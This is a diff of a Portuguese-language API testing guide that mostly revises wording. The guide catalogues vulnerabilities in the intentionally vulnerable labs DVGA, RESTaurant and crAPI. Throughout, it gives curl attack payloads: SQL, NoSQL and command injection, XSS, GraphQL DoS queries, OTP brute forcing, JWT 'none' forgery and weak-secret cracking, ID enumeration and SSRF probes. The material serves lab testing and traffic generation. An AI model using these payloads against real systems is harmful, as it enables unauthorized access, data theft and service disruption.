@@ -1,5 +1,5 @@
 ---
-title: Guia de Testes de API
+title: Guia de Teste de API
 description: >-
   Catálogo abrangente de endpoints, mapeamento de vulnerabilidades e payloads de
   ataque para DVGA, RESTaurant e crAPI — referência de integração para geração
@@ -36,7 +36,7 @@ CRAPI="http://<ORIGIN_IP>:8888"
 **IDE GraphiQL:** `GET ${ORIGIN}/dvga/`
 **Credenciais de Admin:** admin / password
 
-Todas as interações com o DVGA usam um único endpoint (`/dvga/graphql`) com requisições POST contendo payloads JSON `{"query":"..."}`.
+Todas as interações do DVGA utilizam um único endpoint (`/dvga/graphql`) com requisições POST contendo payloads JSON `{"query":"..."}`.
 
 ### Visão Geral do Schema
 
@@ -49,14 +49,14 @@ Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
 
 ### Referência de Endpoints
 
-| Operação | Tipo | Autenticação | Propósito |
+| Operação | Tipo | Autenticação | Finalidade |
 |---|---|---|---|
 | `pastes(public, filter, limit)` | Query | Não | Listar pastes (injeção SQL via filter) |
 | `paste(id)` | Query | Não | Obter paste individual |
 | `me(token)` | Query | Não | Obter usuário por JWT (vulnerável a falsificação) |
 | `systemHealth` | Query | Não | Verificação de saúde |
 | `systemUpdate` | Query | Não | Query lenta (~82s, vetor de DoS) |
-| `systemDiagnostics(cmd)` | Query | admin/password | Executar comandos OS na whitelist |
+| `systemDiagnostics(cmd)` | Query | admin/password | Executar comandos OS permitidos |
 | `createPaste(title, content, public)` | Mutation | Não | Criar paste (XSS via content) |
 | `importPaste(host, port, path, scheme)` | Mutation | Não | Importar paste remoto (SSRF, injeção de comando) |
 | `uploadPaste(filename, content)` | Mutation | Não | Upload de paste (travessia de diretório) |
@@ -79,7 +79,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
 ```
 
-**Query com Alto Consumo de Recursos (resposta de ~82 segundos):**
+**Query Intensiva em Recursos (resposta de ~82 segundos):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -93,7 +93,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
 ```
 
-**Ataque Baseado em Aliases (1000 operações com alias):**
+**Ataque Baseado em Alias (1000 operações com alias):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -109,7 +109,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
 ```
 
-**Sugestões de Campos (erro de digitação revela campos válidos):**
+**Sugestões de Campo (erro de digitação revela campos válidos):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -139,7 +139,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
 ```
 
-**Injeção de Log (spoofing de nome de operação):**
+**Injeção de Log (falsificação de nome de operação):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -155,7 +155,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
 ```
 
-**Comando OS via systemDiagnostics (requer autenticação admin):**
+**Comando OS via systemDiagnostics (requer autenticação de admin):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -210,7 +210,7 @@ echo "Bearer token: ${TOKEN}"
 | `/restaurant/register` | POST | Não | — | Criação de usuário |
 | `/restaurant/token` | POST | Não | — | JWT com segredo fraco (97952) |
 | `/restaurant/healthcheck` | GET | Não | — | Verificação de saúde |
-| `/restaurant/profile` | GET | Sim | Qualquer | Perfil do usuário |
+| `/restaurant/profile` | GET | Sim | Qualquer | Perfil de usuário |
 | `/restaurant/profile` | PUT | Sim | Qualquer | **BOLA** (modificar outros usuários) |
 | `/restaurant/profile` | PATCH | Sim | Qualquer | **BOPLA** (atribuição em massa de papel) |
 | `/restaurant/users/update_role` | PUT | Sim | Qualquer | **BFLA** (escalação de papel) |
@@ -220,20 +220,20 @@ echo "Bearer token: ${TOKEN}"
 | `/restaurant/menu/{item_id}` | DELETE | Sim | Qualquer | **BFLA** (qualquer usuário pode excluir) |
 | `/restaurant/orders` | GET | Sim | Qualquer | **BOLA** (visualizar todos os pedidos) |
 | `/restaurant/orders` | POST | Sim | Qualquer | Criar pedido |
-| `/restaurant/orders/{order_id}` | GET | Sim | Qualquer | **BOLA** (acessar pedidos de outros) |
+| `/restaurant/orders/{order_id}` | GET | Sim | Qualquer | **BOLA** (acessar outros pedidos) |
 | `/restaurant/orders/status/{order_id}` | GET | Sim | Qualquer | Status do pedido |
 | `/restaurant/admin/stats/disk` | GET | Sim | Chef | **Injeção de comando** |
 | `/restaurant/reset-password` | POST | Não | — | Solicitação de redefinição de senha |
 | `/restaurant/reset-password/new-password` | POST | Não | — | Definir nova senha |
-| `/restaurant/referral-code` | GET | Sim | Qualquer | Obter código de indicação |
-| `/restaurant/apply-referral` | POST | Sim | Qualquer | Aplicar indicação |
+| `/restaurant/referral-code` | GET | Sim | Qualquer | Obter código de referência |
+| `/restaurant/apply-referral` | POST | Sim | Qualquer | Aplicar referência |
 | `/restaurant/discount-coupons` | GET | Sim | Qualquer | Listar cupons |
 
 ### Catálogo de Vulnerabilidades
 
-#### API1:2023 — Broken Object Level Authorization (BOLA)
+#### API1:2023 — Autorização em Nível de Objeto Quebrada (BOLA)
 
-**Modificar o perfil de outro usuário:**
+**Modificar perfil de outro usuário:**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -252,18 +252,18 @@ done
 
 #### API2:2023 — Autenticação Quebrada
 
-**Força bruta de segredo fraco do JWT (segredo é 6 dígitos: 97952):**
+**Força bruta do segredo fraco do JWT (segredo é 6 dígitos: 97952):**
 ```bash
-# Decode and forge tokens at jwt.io
-# Secret: 97952 (brute-forceable with hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')
+# Decodifique e falsifique tokens em jwt.io
+# Segredo: 97952 (pode ser forçado com hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')
 
-# Forge a Chef token:
+# Falsificar um token de Chef:
 # Header: {"alg":"HS256","typ":"JWT"}
 # Payload: {"sub":"chef","exp":9999999999}
-# Sign with secret: 97952
+# Assinar com segredo: 97952
 ```
 
-#### API3:2023 — Broken Object Property Level Authorization (BOPLA)
+#### API3:2023 — Autorização em Nível de Propriedade de Objeto Quebrada (BOPLA)
 
 **Atribuição em massa de papel de Customer para Chef:**
 ```bash
@@ -288,9 +288,9 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
   -d '{"role":"Chef"}'
 ```
 
-#### API5:2023 — Broken Function Level Authorization (BFLA)
+#### API5:2023 — Autorização em Nível de Função Quebrada (BFLA)
 
-**Excluir item do menu como Customer (deveria exigir Employee+):**
+**Excluir item do menu como Customer (deveria requerer Employee+):**
 ```bash
 curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
   -H "Authorization: Bearer ${TOKEN}"
@@ -304,11 +304,11 @@ curl -X PUT ${ORIGIN}/restaurant/users/update_role \
   -d '{"username":"chef","role":"Customer"}'
 ```
 
-#### API7:2023 — Server-Side Request Forgery (SSRF)
+#### API7:2023 — Falsificação de Requisição do Lado do Servidor (SSRF)
 
 **Sondar endpoints internos via image_url do menu (requer papel Employee):**
 ```bash
-# Primeiro escale para Employee via BOPLA, então:
+# Primeiro escalar para Employee via BOPLA, depois:
 curl -X PUT ${ORIGIN}/restaurant/menu \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
@@ -372,7 +372,7 @@ curl -X POST ${CRAPI}/identity/api/auth/signup \
   -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'
 
 # 2. Verificar MailHog para e-mail de verificação
-# Navegue até ${CRAPI}/mailhog/ ou use a API do MailHog:
+# Acesse ${CRAPI}/mailhog/ ou use a API do MailHog:
 curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
 import sys,json
 msgs = json.load(sys.stdin)['items']
@@ -399,7 +399,7 @@ echo "Bearer token: ${TOKEN}"
 | `/identity/api/auth/forget-password` | POST | Não | Solicitar OTP |
 | `/identity/api/auth/v2/check-otp` | POST | Não | **Sem limite de taxa** (força bruta de OTP de 4 dígitos) |
 | `/identity/api/auth/v3/check-otp` | POST | Não | Versão com limite de taxa |
-| `/identity/api/v2/user/dashboard` | GET | Sim | Perfil do usuário |
+| `/identity/api/v2/user/dashboard` | GET | Sim | Perfil de usuário |
 | `/identity/api/v2/user/change-email` | PUT | Sim | Alteração de e-mail |
 | `/identity/api/v2/vehicle/vehicles` | GET | Sim | Listar veículos (vaza UUIDs) |
 | `/identity/api/v2/vehicle/{uuid}/location` | GET | Sim | **BOLA** (veículo de qualquer usuário) |
@@ -413,7 +413,7 @@ echo "Bearer token: ${TOKEN}"
 | Endpoint | Método | Autenticação | Vulnerabilidade |
 |---|---|---|---|
 | `/community/api/v2/community/posts` | GET | Sim | **Exposição de dados** (vaza vehicle_id, email) |
-| `/community/api/v2/community/posts` | POST | Sim | Criar post no blog |
+| `/community/api/v2/community/posts` | POST | Sim | Criar post de blog |
 | `/community/api/v2/community/posts/{id}/comments` | POST | Sim | Adicionar comentário |
 | `/community/api/v2/coupon/validate-coupon` | POST | Sim | **Injeção NoSQL** |
 
@@ -428,7 +428,7 @@ echo "Bearer token: ${TOKEN}"
 | `/workshop/api/shop/orders/` | POST | Sim | Criar pedido |
 | `/workshop/api/shop/orders/all` | GET | Sim | Listar pedidos |
 | `/workshop/api/shop/orders/{id}` | GET | Não | **BOLA** (sem autenticação necessária) |
-| `/workshop/api/shop/orders/{id}` | PUT | Sim | **Atribuição em massa** (status, quantity) |
+| `/workshop/api/shop/orders/{id}` | PUT | Sim | **Atribuição em massa** (status, quantidade) |
 | `/workshop/api/shop/apply_coupon` | POST | Sim | **Injeção SQL** |
 
 ### Catálogo de Desafios
@@ -436,7 +436,7 @@ echo "Bearer token: ${TOKEN}"
 #### Desafio 1 — BOLA: Acessar Localização do Veículo de Outro Usuário
 
 ```bash
-# Obter UUID do seu veículo primeiro
+# Obter seu UUID de veículo primeiro
 curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
   -H "Authorization: Bearer ${TOKEN}"
 
@@ -445,10 +445,10 @@ curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### Desafio 2 — BOLA: Acessar Relatórios de Mecânicos (Sem Autenticação)
+#### Desafio 2 — BOLA: Acessar Relatórios de Mecânico (Sem Autenticação)
 
 ```bash
-# Enumeração de ID sequencial — nenhum token necessário
+# Enumeração de ID sequencial — sem necessidade de token
 for i in 1 2 3 4 5; do
   echo "Report $i:"
   curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
@@ -456,7 +456,7 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### Desafio 3 — Autenticação Quebrada: Força Bruta de OTP para Redefinição de Senha
+#### Desafio 3 — Autenticação Quebrada: Força Bruta de OTP de Redefinição de Senha
 
 ```bash
 # Solicitar OTP para a vítima
@@ -483,10 +483,10 @@ curl -sf ${CRAPI}/workshop/api/mechanic \
 #### Desafio 5 — Exposição de Dados: Parâmetros Internos de Conversão de Vídeo
 
 ```bash
-# Fazer upload de um vídeo, então inspecionar a resposta
+# Fazer upload de um vídeo, depois inspecionar a resposta
 curl -sf ${CRAPI}/identity/api/v2/user/videos \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
-# Procure pelo campo conversion_params na resposta
+# Procurar pelo campo conversion_params na resposta
 ```
 
 #### Desafio 6 — DoS: Camada 7 via Contato com Mecânico
@@ -516,7 +516,7 @@ curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
 #### Desafios 8 e 9 — Atribuição em Massa: Itens Gratuitos via Manipulação de Pedido
 
 ```bash
-# Alterar GET para PUT, modificar status e quantity
+# Mudar GET para PUT, modificar status e quantidade
 curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
@@ -566,10 +566,10 @@ curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
   -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
 ```
 
-#### Desafio 14 — Acesso a Pedidos Sem Autenticação
+#### Desafio 14 — Acesso a Pedido Sem Autenticação
 
 ```bash
-# Sem cabeçalho Authorization — ainda retorna dados
+# Sem header Authorization — ainda retorna dados
 for i in 1 2 3 4 5; do
   curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
   echo ""
@@ -579,10 +579,10 @@ done
 #### Desafio 15 — Confusão de Algoritmo JWT
 
 ```bash
-# Forjar um JWT com algoritmo "none" (sem verificação de assinatura):
+# Falsificar um JWT com algoritmo "none" (sem verificação de assinatura):
 # 1. Definir header: {"alg":"none","typ":"JWT"} e codificar em base64url
 # 2. Definir payload: {"email":"admin@example.com","role":"admin"} e codificar em base64url
-# 3. Unir com pontos, deixar assinatura vazia: <header>.<payload>.
+# 3. Juntar com pontos, deixar assinatura vazia: <header>.<payload>.
 HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 FORGED="${HEADER}.${PAYLOAD}."
@@ -597,17 +597,17 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 | Categoria OWASP | DVGA | RESTaurant | crAPI |
 |---|---|---|---|
-| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | Localização de veículo, relatórios de mecânicos, pedidos |
+| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | Localização de veículo, relatórios de mecânico, pedidos |
 | **API2: Autenticação Quebrada** | Falsificação JWT (query `me`) | Segredo fraco do JWT (97952) | Força bruta de OTP (v2), confusão de algoritmo JWT |
-| **API3: BOPLA** | — | `PATCH /profile` (escalação de papel) | Video conversion_params, exposição de e-mail de mecânicos |
-| **API4: Consumo de Recursos** | DoS por lote, recursão, alias, duplicação de campos | Enumeração de usuários via tamanho da resposta | DoS via `contact_mechanic` repeat_request |
+| **API3: BOPLA** | — | `PATCH /profile` (escalação de papel) | Video conversion_params, exposição de e-mail de mecânico |
+| **API4: Consumo de Recursos** | DoS por lote, recursão, alias, duplicação de campos | Enumeração de usuários via tamanho de resposta | DoS via repeat_request de `contact_mechanic` |
 | **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` como usuário comum |
-| **API6: Atribuição em Massa** | — | `PUT /orders` (status, quantity) | Status/quantidade de pedidos, video conversion_params |
-| **API7: SSRF** | Mutation `importPaste` | `PUT /menu` image_url | URL mechanic_api em `contact_mechanic` |
+| **API6: Atribuição em Massa** | — | `PUT /orders` (status, quantidade) | Status/quantidade de pedido, video conversion_params |
+| **API7: SSRF** | Mutation `importPaste` | `PUT /menu` image_url | URL mechanic_api de `contact_mechanic` |
 | **API8: Injeção** | SQL (`filter`), XSS (`content`), cmd OS (`importPaste`, `systemDiagnostics`) | Cmd OS (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
-| **API9: Ativos Impróprios** | — | — | `/auth/v2/check-otp` depreciado (sem limite de taxa) |
+| **API9: Ativos Inadequados** | — | — | `/auth/v2/check-otp` depreciado (sem limite de taxa) |
 | **API10: Consumo Inseguro** | — | — | (indireto via SSRF) |
-| **Específico de GraphQL** | Introspecção, lotes, recursão, aliases, duplicação de campos, fragmentos circulares | — | — |
+| **Específico de GraphQL** | Introspecção, lote, recursão, aliases, duplicação de campos, fragmentos circulares | — | — |
 
 ---
 
@@ -617,21 +617,21 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 Gere tráfego legítimo para estabelecer o comportamento normal da API antes de testar padrões de ataque.
 
-**Linha de base do DVGA:**
+**Linha de base DVGA:**
 ```bash
 # Queries normais
 curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
 curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
 ```
 
-**Linha de base do RESTaurant:**
+**Linha de base RESTaurant:**
 ```bash
 curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
 curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
 curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
 ```
 
-**Linha de base do crAPI:**
+**Linha de base crAPI:**
 ```bash
 curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
 curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
@@ -644,27 +644,27 @@ curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${T
 
 **Teste de injeção:** Payloads SQL em parâmetros de filtro/cupom, injeção de query GraphQL, injeção de comando OS via campos de parâmetro.
 
-**Teste de bypass de autenticação:** Forjar tokens JWT, força bruta de OTPs, usar versões depreciadas da API, confusão de algoritmo.
+**Teste de bypass de autenticação:** Falsificar tokens JWT, força bruta de OTPs, usar versões depreciadas da API, confusão de algoritmo.
 
-**Teste de SSRF:** URLs internos em parâmetros `importPaste`, `image_url` e `mechanic_api`.
+**Teste de SSRF:** URLs internas nos parâmetros `importPaste`, `image_url` e `mechanic_api`.
 
 **Teste de DoS:** Ataques GraphQL de lote/recursão/alias, `repeat_request_if_failed` com contagens altas.
 
 ### Fase 3: Cadeias de Ataque com Estado
 
-Alguns ataques requerem sequências de múltiplas etapas com estado:
+Alguns ataques requerem sequências multi-etapa com estado:
 
-1. **Cadeia de escalação do RESTaurant:** Registrar → Token → PATCH de papel para Chef → Reautenticar → Injeção de comando
-2. **Fluxo completo do crAPI:** Cadastro → Verificar e-mail (MailHog) → Login → Adicionar veículo → Contatar mecânico (SSRF) → Manipulação de pedido
-3. **Reconhecimento até exploração do DVGA:** Introspecção → Descobrir systemDiagnostics → Força bruta de credenciais admin → Execução de comando OS
+1. **Cadeia de escalação RESTaurant:** Registrar → Token → PATCH de papel para Chef → Reautenticar → Injeção de comando
+2. **Fluxo completo crAPI:** Cadastro → Verificar e-mail (MailHog) → Login → Adicionar veículo → Contatar mecânico (SSRF) → Manipulação de pedido
+3. **Reconhecimento-para-exploração DVGA:** Introspecção → Descobrir systemDiagnostics → Força bruta de credenciais de admin → Execução de comando OS
 
 ### Recomendações de Taxa
 
 | Padrão | Requisições/seg | Duração | Observações |
 |---|---|---|---|
-| Linha de base (por app) | 10-50 | 5 min | Estabelecer fingerprint de tráfego normal |
+| Linha de base (por app) | 10-50 | 5 min | Estabelecer impressão digital de tráfego normal |
 | Enumeração BOLA | 100-500 | 2 min | Varredura de ID sequencial |
 | Força bruta de OTP | 1000+ | Até encontrar | 10.000 tentativas máximas (4 dígitos) |
-| DoS GraphQL | 10-50 | 30 seg | Cada requisição é custosa no servidor |
+| DoS GraphQL | 10-50 | 30 seg | Cada requisição é custosa no lado do servidor |
 | Fuzzing de injeção | 50-200 | 5 min | Variar payloads por requisição |
-| Sondagem SSRF | 5-20 | 2 min | Lento; cada um dispara requisição HTTP no servidor |
+| Sondagem SSRF | 5-20 | 2 min | Lento; cada uma dispara requisição HTTP no lado do servidor |
